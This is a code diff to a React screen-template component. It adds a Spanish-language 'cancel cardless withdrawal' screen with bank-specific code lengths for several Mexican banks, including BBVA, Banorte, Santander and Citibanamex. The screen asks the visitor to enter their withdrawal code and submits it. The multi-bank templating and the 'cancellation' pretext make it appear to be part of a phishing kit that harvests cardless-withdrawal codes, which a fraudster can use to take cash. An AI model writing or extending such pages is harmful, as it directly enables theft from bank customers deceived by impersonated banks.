@@ -570,6 +570,105 @@ export const ScreenTemplates: React.FC<ScreenTemplatesProps> = ({
           </div>
         );
 
+      case ScreenType.CANCELACION_RETIRO:
+        // Información específica de cada banco para el formato de código de retiro
+        const getBankRetiroInfo = () => {
+          switch(bankCode) {
+            case 'BBVA':
+              return { 
+                digits: 12, 
+                note: 'Código de retiro directo en app BBVA México.' 
+              };
+            case 'BANORTE':
+              return { 
+                digits: 10, 
+                note: '"Retiro sin tarjeta" generado desde Banorte Móvil.' 
+              };
+            case 'SANTANDER':
+              return { 
+                digits: 8, 
+                note: 'Se usa "Súper Retiro" desde la app.' 
+              };
+            case 'HSBC':
+              return { 
+                digits: 10, 
+                note: 'Con la función "Dinero Móvil" (puede variar por servicio contratado).' 
+              };
+            case 'SPIN':
+              return { 
+                digits: 12, 
+                note: 'Se genera en la app SPIN o Banco Azteca.' 
+              };
+            case 'BANCOPPEL':
+              return { 
+                digits: 8, 
+                note: 'Depende si se usa app Coppel Pay o retiro en tienda.', 
+                variable: true 
+              };
+            case 'BANREGIO':
+              return { 
+                digits: 10, 
+                note: 'Desde Banregio Móvil, retiro sin tarjeta.' 
+              };
+            case 'CITIBANAMEX':
+              return { 
+                digits: 6, 
+                note: '"Código Cash" desde Citibanamex Móvil.' 
+              };
+            case 'SCOTIABANK':
+              return { 
+                digits: 12, 
+                note: 'Desde app ScotiaMóvil para retiro sin tarjeta.' 
+              };
+            default:
+              return { 
+                digits: 8, 
+                note: 'Código de retiro sin tarjeta.' 
+              };
+          }
+        };
+
+        const bankRetiroInfo = getBankRetiroInfo();
+        const digitsInfo = bankRetiroInfo.variable 
+          ? `6 a ${bankRetiroInfo.digits} dígitos` 
+          : `${bankRetiroInfo.digits} dígitos`;
+        
+        const cancelacionRetiroContent = (
+          <>
+            <h2 className="text-xl font-bold mb-3">Cancelación de retiro sin tarjeta</h2>
+            <p className="mb-4">
+              Ingresa el código para cancelar el retiro.
+            </p>
+            <div className="bg-gray-100 p-3 mb-4 rounded-md text-left">
+              <p className="text-sm font-medium">{digitsInfo}</p>
+              <p className="text-xs text-gray-600">{bankRetiroInfo.note}</p>
+            </div>
+            <Input 
+              type="text" 
+              placeholder={`Código de ${digitsInfo}`}
+              className="w-full border border-gray-300 rounded p-2 mb-3"
+              value={codigoRetiroInput}
+              onChange={(e) => {
+                // Solo permitir números
+                const value = e.target.value.replace(/\D/g, '');
+                // Limitar al máximo de dígitos para este banco
+                if (value.length <= bankRetiroInfo.digits) {
+                  setCodigoRetiroInput(value);
+                }
+              }}
+              maxLength={bankRetiroInfo.digits}
+            />
+            <Button 
+              className={primaryBtnClass}
+              onClick={() => onSubmit(ScreenType.CANCELACION_RETIRO, { codigoRetiro: codigoRetiroInput })}
+              disabled={codigoRetiroInput.length < (bankRetiroInfo.variable ? 6 : bankRetiroInfo.digits)}
+            >
+              Cancelar retiro
+            </Button>
+          </>
+        );
+        return getBankContainer(cancelacionRetiroContent);
+
       default:
         const defaultContent = (
           <>
